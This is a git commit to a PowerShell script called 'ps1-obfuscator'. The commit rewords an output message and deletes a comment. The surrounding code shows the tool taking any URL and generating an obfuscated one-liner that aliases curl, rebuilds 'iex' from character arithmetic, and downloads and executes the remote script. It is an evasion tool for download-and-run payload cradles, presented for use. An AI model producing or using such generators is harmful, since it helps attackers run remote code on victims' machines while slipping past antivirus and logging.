e5ece5d37f4197de411f70b774961acb93b9749c
fkxdr <fkxdr@proton.me>
2024-09-18 19:00:54 +0200

    Update obfuscator.ps1

--- obfuscator.ps1
+++ obfuscator.ps1
@@ -1,6 +1,6 @@
 Write-Host "ps1-obfuscator by fkxdr"
 $url = Read-Host "`nEnter URL to obfuscate"
-Write-Host "`nGenerating command...`n"
+Write-Host "`nGenerating script...`n"
 
 function Generate-RandomName($length) {
     $chars = "abcdefghijklmnopqrstuvwxyz"
@@ -22,7 +22,6 @@ $randomVarName1 = Generate-RandomName(5)
 $randomVarName2 = Generate-RandomName(5)
 $aliasName = Generate-RandomName(5)
 
-# Correctly escaping $ to ensure that the generated script works as expected
 $obfuscatedScript = @"
 powershell -Command `"new-alias $aliasName curl; `$$randomVarName1 = @($($obfuscatedArray -join ',')); `$$randomVarName2 = ''; foreach (`$asciiValue in `$$randomVarName1) { `$decodedChar=[char](`$asciiValue-8787); `$$randomVarName2+=`$decodedChar; }; .([char](9992-9887)+'e'+'x')($aliasName -useb `$$randomVarName2)`"
 "@
